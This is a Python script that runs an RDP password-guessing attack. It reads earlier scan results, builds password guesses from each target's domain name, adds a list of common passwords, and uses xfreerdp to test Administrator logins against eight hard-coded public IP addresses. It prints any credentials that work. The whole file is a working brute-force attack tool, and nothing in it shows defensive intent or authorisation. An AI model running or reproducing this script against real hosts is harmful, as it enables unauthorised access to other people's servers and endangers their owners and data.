import subprocess, json, glob, sys

# Map IP -> domain passwords
ip_pws = {}
for f in glob.glob("/tmp/scan_results/*.json"):
    d = json.load(open(f))
    domain = d["domain"]
    name = domain.split(".")[0]
    for ip in d.get("ips", []):
        if ip not in ip_pws:
            ip_pws[ip] = []
        ip_pws[ip].extend([name, name+"123", name+"888", name+"2024", name+"2025"])

# Common passwords
common = ["100206","admin123","admin888","123456","password","P@ssw0rd","root"]

# RDP hosts
hosts = [
    "113.113.81.253","117.50.115.224","121.196.233.163","123.57.180.20",
    "139.129.193.165","221.231.138.20","47.99.196.80","59.110.169.32"
]

print("=== Verifying RDP hosts with xfreerdp ===")
for ip in hosts:
    pws = list(set(ip_pws.get(ip, []) + common))
    found = False
    for pw in pws[:15]:  # limit per host
        try:
            r = subprocess.run(["timeout","10","xvfb-run","-a","xfreerdp",
                "/v:%s" % ip, "/u:administrator", "/p:%s" % pw,
                "/cert-ignore", "/auth-only", "+sec-nla"],
                capture_output=True, text=True, timeout=12)
        except:
            continue
        
        if "exit status 0" in r.stdout + r.stderr:
            print(">>> CONFIRMED: %s Administrator/%s <<<" % (ip, pw))
            found = True
            break
    if not found:
        print("  %s: no match" % ip)

print("RDP verification complete")
